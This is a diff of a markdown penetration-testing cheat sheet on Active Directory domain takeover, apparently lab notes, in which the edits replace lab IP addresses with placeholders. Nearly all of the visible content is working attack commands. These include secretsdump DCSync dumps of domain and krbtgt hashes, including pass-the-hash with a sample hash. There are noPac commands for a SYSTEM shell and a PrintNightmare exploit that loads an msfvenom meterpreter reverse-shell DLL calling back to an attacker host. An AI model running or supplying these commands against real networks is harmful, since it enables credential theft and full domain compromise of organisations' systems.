@@ -1,6 +1,6 @@
 # DCSync & Domain Takeover Attacks
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ## DCSync — Replicate Domain Hashes Without Touching NTDS.dit
 
@@ -14,16 +14,16 @@
 - **Payload/Method:**
   ```bash
   # Full domain hash dump
-  secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/adunn@172.16.5.5
+  secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/<USER>@<DC_IP>
 
   # Single user (krbtgt for Golden Ticket)
-  secretsdump.py -just-dc-user DOMAIN/krbtgt DOMAIN/adunn@172.16.5.5
+  secretsdump.py -just-dc-user DOMAIN/krbtgt DOMAIN/<USER>@<DC_IP>
 
   # Using VSS for stealthier extraction
-  secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/adunn@172.16.5.5 -use-vss
+  secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/<USER>@<DC_IP> -use-vss
 
   # With captured hash (pass-the-hash style)
-  secretsdump.py -just-dc-user DOMAIN/administrator "DC01$"@172.16.5.5 \
+  secretsdump.py -just-dc-user DOMAIN/administrator "DC01$"@<DC_IP> \
     -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
   ```
 
@@ -68,16 +68,16 @@
 - **Payload/Method:**
   ```bash
   # Check if vulnerable
-  sudo python3 scanner.py DOMAIN.LOCAL/user:password -dc-ip 172.16.5.5 -use-ldap
+  sudo python3 scanner.py DOMAIN.LOCAL/user:password -dc-ip <DC_IP> -use-ldap
 
   # Get SYSTEM shell
   sudo python3 noPac.py DOMAIN.LOCAL/user:password \
-    -dc-ip 172.16.5.5 -dc-host DC01 \
+    -dc-ip <DC_IP> -dc-host DC01 \
     -shell --impersonate administrator -use-ldap
 
   # DCSync via noPac (no shell needed)
   sudo python3 noPac.py DOMAIN.LOCAL/user:password \
-    -dc-ip 172.16.5.5 -dc-host DC01 \
+    -dc-ip <DC_IP> -dc-host DC01 \
     --impersonate administrator -use-ldap \
     -dump -just-dc-user DOMAIN/administrator
   ```
@@ -94,7 +94,7 @@
 - **Payload/Method:**
   ```bash
   # Check if MS-PAR/MS-RPRN exposed
-  rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+  rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
 
   # Generate reverse shell DLL
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=8080 \
@@ -107,7 +107,7 @@
   pip3 uninstall impacket
   git clone https://github.com/cube0x0/impacket && cd impacket && python3 setup.py install
 
-  sudo python3 CVE-2021-1675.py DOMAIN.LOCAL/user:password@172.16.5.5 \
+  sudo python3 CVE-2021-1675.py DOMAIN.LOCAL/user:password@<DC_IP> \
     '\\<attacker-ip>\CompData\backupscript.dll'
   ```
 
@@ -144,7 +144,7 @@
 
   # Step 5: DCSync with DC machine hash
   secretsdump.py -just-dc-user DOMAIN/administrator \
-    "DC01$"@172.16.5.5 \
+    "DC01$"@<DC_IP> \
     -hashes aad3c435b514a4eeaad3b935b51304fe:<dc-machine-hash>
 
   # Alternative Step 5: Pass-the-ticket DCSync
